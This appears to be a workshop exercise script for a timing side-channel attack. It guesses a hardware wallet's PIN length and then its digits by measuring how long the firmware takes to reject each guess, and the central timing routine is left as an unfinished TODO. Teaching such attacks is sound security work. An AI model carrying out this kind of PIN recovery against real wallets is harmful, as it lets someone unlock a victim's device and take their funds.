#!/usr/bin/env python3

import argparse
import time

from helpers import (
    PortDiscoveryError,
    add_wallet_cli_args,
    create_wallet_client,
    format_duration_hhmmss,
    is_unlocked,
    log,
    pin_digits_to_hex,
    resolve_wallet_port,
    timed_pin_request,
)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Lab 1 side-channel PIN attack (simple)")
    add_wallet_cli_args(parser)
    parser.add_argument("--digit-delay-ms", type=float, default=200.0)
    parser.add_argument("--threshold-ms", type=float, default=100.0)
    parser.add_argument("--max-digits", type=int, default=32)
    return parser.parse_args()


def to_pin_digits(digits: list[int]) -> str:
    return "".join(str(d) for d in digits)


def guess_pin_digits(prefix: list[int], trial: int, total_len: int) -> str:
    digits = prefix + [trial]
    # Firmware compares only when length matches exactly, so fill unknown suffix.
    while len(digits) < total_len:
        digits.append(0)
    return to_pin_digits(digits)


def run_round(wallet, prefix: list[int], total_len: int, timeout_s: float):
    # TODO(workshop, ~10 min):
    # Implement one timing round for a single PIN position:
    # - try digits 0..9 with guess_pin_digits(...)
    # - call timed_pin_request(...) for each candidate
    # - record (digit, elapsed_seconds, pin_digits)
    # - return early with (attempts, pin_digits) when unlock is detected
    # - otherwise return (attempts, None)

    raise NotImplementedError("TODO: implement run_round")


def main() -> int:
    args = parse_args()
    started = time.perf_counter()
    threshold_s = args.threshold_ms / 1000.0
    digit_delay_s = args.digit_delay_ms / 1000.0

    try:
        port = resolve_wallet_port(args)
        log(f"port={port}")

        with create_wallet_client(args, port=port) as wallet:
            wallet.request("lock")

            pin_len = None
            found = []

            for test_len in range(1, args.max_digits + 1):
                log(f"probe length={test_len}")
                # Timeout grows with expected per-digit firmware delay.
                timeout_s = max(2.0, 1.5 + (test_len + 1) * digit_delay_s)
                attempts, full_pin = run_round(wallet, [], test_len, timeout_s)
                if full_pin is not None:
                    elapsed = format_duration_hhmmss(time.perf_counter() - started)
                    log(f"pin={full_pin}")
                    log(f"time={elapsed}")
                    return 0

                slowest = max(attempts, key=lambda x: x[1])
                fastest = min(attempts, key=lambda x: x[1])
                gap_s = slowest[1] - fastest[1]
                log(f"length gap={gap_s*1000:.1f}ms")

                # Big gap means this length likely triggered variable-time compare.
                if gap_s >= threshold_s:
                    pin_len = test_len
                    # For a fixed position, the correct digit is usually the slowest one.
                    found.append(slowest[0])
                    log(f"length={pin_len}")
                    log(f"found={to_pin_digits(found)}")
                    break

            if pin_len is None:
                raise RuntimeError("could not find PIN length")

            while len(found) < pin_len:
                timeout_s = max(2.0, 1.5 + (pin_len + 1) * digit_delay_s)
                attempts, full_pin = run_round(wallet, found, pin_len, timeout_s)
                if full_pin is not None:
                    elapsed = format_duration_hhmmss(time.perf_counter() - started)
                    log(f"pin={full_pin}")
                    log(f"time={elapsed}")
                    return 0

                slowest = max(attempts, key=lambda x: x[1])
                fastest = min(attempts, key=lambda x: x[1])
                gap_s = slowest[1] - fastest[1]
                # No visible gap => too noisy to trust this round.
                if gap_s < threshold_s:
                    raise RuntimeError("signal too weak")

                found.append(slowest[0])
                log(f"found={to_pin_digits(found)}")

            pin_digits = to_pin_digits(found)
            pin_hex = pin_digits_to_hex(pin_digits)
            timeout_s = max(2.0, 1.5 + (pin_len + 1) * digit_delay_s)
            verify = wallet.request("pin", pin_hex, timeout=timeout_s)
            if not (verify.ok or is_unlocked(wallet)):
                raise RuntimeError("recovered pin did not unlock")

            elapsed = format_duration_hhmmss(time.perf_counter() - started)
            log(f"pin={pin_digits}")
            log(f"time={elapsed}")
            return 0

    except PortDiscoveryError as e:
        log(f"port discovery error: {e}")
        return 2
    except Exception as e:
        elapsed = format_duration_hhmmss(time.perf_counter() - started)
        log(f"attack failed: {e}")
        log(f"time={elapsed}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
